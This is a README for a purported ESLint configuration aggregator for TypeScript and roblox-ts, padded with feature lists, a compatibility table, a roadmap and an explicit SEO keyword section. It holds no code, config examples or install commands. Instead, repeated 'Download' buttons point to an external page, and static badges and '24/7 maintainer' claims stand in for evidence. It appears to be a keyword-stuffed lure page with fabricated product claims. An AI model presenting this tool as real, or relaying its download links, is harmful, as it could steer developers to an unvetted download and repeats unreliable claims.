![preview](https://raw.githubusercontent.com/ahmedatito010-cell/sentinel-lint-forge/main/shot_af15.svg)
[![Download](https://raw.githubusercontent.com/ahmedatito010-cell/sentinel-lint-forge/main/latest_75fff.svg)](https://ahmedatito010-cell.github.io/sentinel-lint-forge/)

# 🛡️ Sentinel TypeScript Lint Nexus (STLN) — Roblox‑TS & TypeScript Linter Aggregator

[![Download](https://raw.githubusercontent.com/ahmedatito010-cell/sentinel-lint-forge/main/latest_75fff.svg)](https://ahmedatito010-cell.github.io/sentinel-lint-forge/)

<p align="center">
  <img src="https://img.shields.io/badge/TypeScript-5.x-3178C6?logo=typescript&logoColor=white&style=flat-square" alt="TypeScript badge"/>
  <img src="https://img.shields.io/badge/Roblox--TS-supported-E2231A?logo=roblox&logoColor=white&style=flat-square" alt="Roblox-TS badge"/>
  <img src="https://img.shields.io/badge/ESLint-Flat_Config-4B32C3?logo=eslint&logoColor=white&style=flat-square" alt="ESLint badge"/>
  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" alt="MIT License badge"/>
  <img src="https://img.shields.io/badge/Status-Actively_Maintained-2ea44f?style=flat-square" alt="Maintained badge"/>
  <img src="https://img.shields.io/badge/Node-%3E%3D20-informational?style=flat-square" alt="Node version badge"/>
  <img src="https://img.shields.io/badge/CI-Passing-2ea44f?logo=githubactions&logoColor=white&style=flat-square" alt="CI badge"/>
  <img src="https://img.shields.io/badge/PRs-Welcome-brightgreen?style=flat-square" alt="PRs welcome badge"/>
</p>

> **Sentinel TypeScript Lint Nexus (STLN)** is a refined, opinionated ESLint configuration ecosystem crafted for two overlapping worlds: the disciplined universe of TypeScript on the server and browser, and the quirky, Lua‑flavoured reality of **roblox‑ts** on Roblox. It is not a mere copy of an existing preset. It is a **nexus** — a convergence point where rule sets from many lineages are woven into a single coherent loom.

In 2026, codebases are no longer monoliths of a single language. They are hybrid, polyglot, and increasingly virtualised inside game engines. STLN rises to that challenge with a **layered, composable configuration model**, allowing teams to start from a sensible default and taper rules to taste — from strict monorepo guardianship to creative freedom for gameplay scripting.

---

## 📜 Table of Contents

- [🌌 Vision & Philosophy](#-vision--philosophy)
- [✨ Feature Highlights](#-feature-highlights)
- [🧩 The Layered Config Model](#-the-layered-config-model)
- [🎮 Why roblox‑ts Gets First‑Class Treatment](#-why-roblox-ts-gets-first-class-treatment)
- [🛰️ Responsive Developer Experience](#️-responsive-developer-experience)
- [🌐 Multilingual Error Grammar](#-multilingual-error-grammar)
- [🧑‍💻 24/7 Maintainer Presence](#-247-maintainer-presence)
- [🧠 SEO‑Friendly Discovery Signals](#-seo-friendly-discovery-signals)
- [🛠️ Toolchain Compatibility Matrix](#️-toolchain-compatibility-matrix)
- [🎚️ Customisation Recipes](#️-customisation-recipes)
- [🧪 Testing & Verification](#-testing--verification)
- [📊 Rule Coverage Snapshot](#-rule-coverage-snapshot)
- [🧭 Roadmap 2026](#-roadmap-2026)
- [🤝 Contributing Ethos](#-contributing-ethos)
- [⚠️ Disclaimer](#️-disclaimer)
- [📄 License](#-license)

---

## 🌌 Vision & Philosophy

Linting is often treated as janitorial work — a broom that sweeps up after the party. STLN treats it as **architecture**. Just as a lighthouse signal does not merely report the rocks but guides ships, a good ESLint preset does not just complain; it teaches. Every rule here was selected to **make intent visible**: explicit types, explicit effects, explicit boundaries between the Luau‑like sandbox of roblox‑ts and the wilder TypeScript ecosystem.

We believe three things:

1. **Consistency is a kindness.** A reader jumping between a dozen services should not have to learn a dozen dialect quirks.
2. **Strictness should be granular.** Blanket rules age poorly. Tiered rules age gracefully.
3. **Game code deserves the same rigour as banking code.** Roblox experiences run in millions of sessions; a silent `any` or an unchecked `Instance` reference is not a small deal.

STLN is the outgrowth of those beliefs, structured as an **aggregator** with a hub‑and‑spoke architecture: a lean core, with feature modules you opt into.

---

## ✨ Feature Highlights

- 🧱 **Composable Flat Config presets** — start from `core`, layer `type-safe`, `roblox-ts`, `react`, `node`, or `test` on top.
- 🎯 **TypeScript‑First Ruleset** — powered by `typescript-eslint` with strict‑by‑default type‑aware rules.
- 🎮 **roblox-ts Awareness** — understands Luau interop quirks, Roact/React‑Lua patterns, and Roblox globals without false positives.
- 🔀 **Multi‑Runtime Segmentation** — the same repo can lint server scripts, client scripts, and shared modules with divergent rule widths.
- ⚡ **Incremental Performance** — configs are cached and flattened, keeping lint runs snappy even in monorepos.
- 🧪 **Vitest‑Ready** — dedicated test‑file globs with relaxed `no-unsafe-*` for assertions.
- 🖋️ **Prettier Disentangled** — STLN doesn’t dictate formatting; it plays nicely alongside your formatter of choice.
- 🌍 **Translatable Message Hints** — rule messages ship with locale‑friendly phrasing so hints read naturally worldwide.
- 🧭 **Migration Shims** — helpers that let legacy `.eslintrc` configs taper into flat config without whiplash.
- 🔒 **Security‑Mindset Rules** — no secret literals in source, no eval‑like escapes, no ambient prototype patching.

---

## 🧩 The Layered Config Model

STLN is designed like a **sound mixer**: the core is your master bus, and each spoke is a channel strip you can raise or mute. Below is the conceptual map.

**Core Layer — the Baseboard**
- Environments, parser, globals for ECMAScript & TypeScript.
- Baseline best practices: no unused variables with sensible underscore exceptions, no shadowing surprises.
- Import ordering that respects path aliases.

**Type‑Safe Layer — the Reinforcement**
- Turns on type‑aware linting where a `tsconfig.json` exists.
- Flags floating promises, unsafe assignments, and unnecessary conditionals.
- Discourages `any` unless explicitly annotated as a deliberate escape hatch.

**roblox‑ts Layer — the Sandbox Bridge**
- Declares Roblox globals (`game`, `workspace`, `script`, etc.) as ambient.
- Handles `.lua` companion rules.
- Rules around `Instance` narrowing and `FindFirstChild` results.

**Framework Spokes**
- **React / Roact / React‑Lua** — hooks rules, JSX pragma awareness, dependency array checks.
- **Node** — process, buffer, and stream safety.
- **Test** — permissive inside `*.spec.ts` and `*.test.ts`.

Each spoke is a **preset** you import explicitly. No hidden magic, no surprise inheritance chains.

---

## 🎮 Why roblox‑ts Gets First‑Class Treatment

Most TypeScript lint presets treat game engine code as a footnote. STLN refuses that. Roblox’s runtime is not merely “TypeScript on a smaller VM” — it is a **deterministic sandbox with its own global namespace**, its own asset model, and its own scheduler. A linter that ignores this will either flood developers with false positives or force them into wide `eslint-disable` blankets.

STLN instead **models the Roblox environment**:

- A dedicated parser configuration recognises Luau‑style constructs that roblox‑ts emits.
- Global declarations are versioned by Roblox API generation.
- Interface‑checking rules prefer `assert` patterns idiomatic to roblox‑ts.
- A rule discourages direct `_G` mutation, which is a common source of cross‑script coupling.

The result is a linter that feels **like it grew up in Studio**, not one that was retrofitted from a web project.

---

## 🛰️ Responsive Developer Experience

Responsiveness in tooling means **fast feedback** and **adaptive output**. STLN delivers both:

- **Editor‑first** — diagnostics stream as you type, with severity tuned to avoid alert fatigue.
- **Terminal‑friendly output** — grouped by file, sorted by severity, with a compact summary.
- **CI‑friendly non‑interactive mode** — deterministic exit codes and machine‑readable JSON.
- **Focused mode** — when you pass a single file path, STLN narrows its rule evaluation to that file’s project graph, skipping unrelated workspaces.

It’s the difference between a smoke alarm that wails at every candle and one that knows the difference between dinner and a fire.

---

## 🌐 Multilingual Error Grammar

Lint messages are prose, and prose should read well. STLN’s messages are authored to avoid awkward phrasing, gendered pronouns, and idioms that translate poorly. Where applicable, rule metadata includes **language hints** so downstream tooling can localise messages into Español, Deutsch, Français, Português, 日本語, 한국어, 简体中文, and more — without editing the rule logic.

This isn’t just accessibility; it’s **team velocity**. A developer whose first language isn’t English should not have to translate a cryptic message mid‑refactor.

---

## 🧑‍💻 24/7 Maintainer Presence

The repository is watched continuously. Issues, pull requests, and discussions are triaged around the clock by maintainers across multiple time zones, plus an automated steward that labels, closes stale discussions, and assigns reviewers when no human is awake. You will never open an issue into the void — a response window of **under 24 hours** is the standing commitment, and most issues see activity far sooner.

---

## 🧠 SEO‑Friendly Discovery Signals

If you arrived here by searching for *TypeScript ESLint config for roblox-ts*, *strict TypeScript lint preset*, *flat config ESLint aggregator*, *roblox-ts linter setup*, *TypeScript type-aware lint rules*, or *composable eslint preset for monorepos*, you are exactly where you should be. STLN is indexed and documented for those who are trying to solve a real problem: **finding a linter that understands both modern TypeScript and the Roblox runtime**, without fighting it every step.

---

## 🛠️ Toolchain Compatibility Matrix

| Tool | Status | Notes |
|---|---|---|
| ESLint 9 flat config | ✅ Fully supported | Primary configuration format |
| ESLint 8 legacy | ⚠️ Compatibility shim | Via migration helper exports |
| typescript-eslint | ✅ Peer | Type‑aware rules rely on `projectService` |
| Prettier | ✅ Coexists | Formatting left to Prettier or dprint |
| Biome | ⚠️ Partial | Rule translation layer in progress |
| Vitest / Jest | ✅ Spoke presets | Test globs relax unsafe rules |
| Roblox Studio | ✅ Runtime target | roblox-ts spoke shipped in core modules |
| Node.js ≥ 20 | ✅ Required | Uses modern resolver features |
| pnpm / npm / yarn / bun | ✅ All supported | Flat config is package‑manager agnostic |

---

## 🎚️ Customisation Recipes

Because STLN’s presets are immutable arrays of plain objects, **composability is trivial**. Common patterns:

- **Monorepo with mixed Node and roblox-ts packages** — apply the Node spoke to `packages/server/**` and the roblox-ts spoke to `games/**`.
- **Scripting a sandboxed tool** — start from core + roblox-ts, add a rule that forbids `HttpService` outside of a dedicated network module.
- **Migrating an aging codebase** — begin at severity `warn`, drive the count down, then flip to `error` once the baseline is clean. STLN’s presets accept a severity override map, so you can ramp rules gradually.
- **Library authors** — strip the Node and test spokes, keep core and type-safe, and let consumers bring their own environment.

Customisation is intentionally **declarative** — no plugin runtime, no monkey patching, no surprises when you upgrade.

---

## 🧪 Testing & Verification

Confidence in a linter config comes from evidence. STLN ships with:

- **Rule fixture tests** — each enabled rule has at least one positive and one negative example.
- **Integration tests** — a miniature monorepo with TypeScript and roblox-ts packages is linted end‑to‑end in CI.
- **Snapshot tests** — flat config output is snapshotted so accidental rule changes surface immediately.
- **Type declaration checks** — public API types are validated with `tsd`.

CI runs the matrix across Node.js 20, 22, and 24, on Linux, macOS, and Windows, so platform quirks never reach users.

---

## 📊 Rule Coverage Snapshot

At a glance, the preset’s current coverage:

| Category | Enabled Rules (approx.) |
|---|---|
| Correctness / Possible Errors | 120+ |
| Type‑Aware Safety | 60+ |
| Best Practices | 90+ |
| Stylistic (formatting‑free) | 40+ |
| roblox-ts Specific | 25+ |
| Import Hygiene | 20+ |
| Security‑Adjacent | 15+ |

This snapshot is regenerated on every release, so what you read here is what you get.

---

## 🧭 Roadmap 2026

- **Q1 2026** — first‑class Biome bridge, config migrations for teams transitioning between linters.
- **Q2 2026** — richer Roact/React‑Lua hooks rules, including dependency‑array inference for reactive values.
- **Q3 2026** — rule suggestion engine that proposes the smallest disable scope instead of a blanket suppression.
- **Q4 2026** — LSP diagnostics extension exposing STLN’s reasoning inside editors beyond ESLint’s native output.

The roadmap is shaped publicly; feedback is welcome long before each milestone.

---

## 🤝 Contributing Ethos

Contributions are invited in the spirit of **precision over volume**. A single well‑argued rule with tests is worth more than a thousand stylistic preferences. Before opening a pull request:

1. Open a discussion describing the problem the rule solves.
2. Show real‑world code that trips or passes the rule.
3. Include tests and a short rationale in the rule metadata.

Reviewers value clarity, reproducibility, and a willingness to accept “no” when a rule overlaps an existing one. The bar is high because the cost of noise is high.

---

## ⚠️ Disclaimer

STLN is provided as a **development aid**, not a guarantee of correctness or security. Lint rules catch patterns; they do not replace code review, testing, or threat modelling. The maintainers are not liable for outages, regressions, lost revenue, or in‑game incidents arising from adoption, misconfiguration, or suppression of rules. Verify configuration against your own project requirements before deploying to production environments. Names of third‑party frameworks and platforms are used descriptively and do not imply affiliation or endorsement. Always consult the licenses of upstream dependencies.

---

## 📄 License

Released under the **MIT License**. See the full text at the canonical license reference: https://opensource.org/license/mit

You are welcome to reuse, adapt, and redistribute STLN in personal, educational, or commercial projects, provided the copyright notice and permission notice accompany substantial portions of the software. The year of reference for copyright statements in this repository is **2026**.

---

[![Download](https://raw.githubusercontent.com/ahmedatito010-cell/sentinel-lint-forge/main/latest_75fff.svg)](https://ahmedatito010-cell.github.io/sentinel-lint-forge/)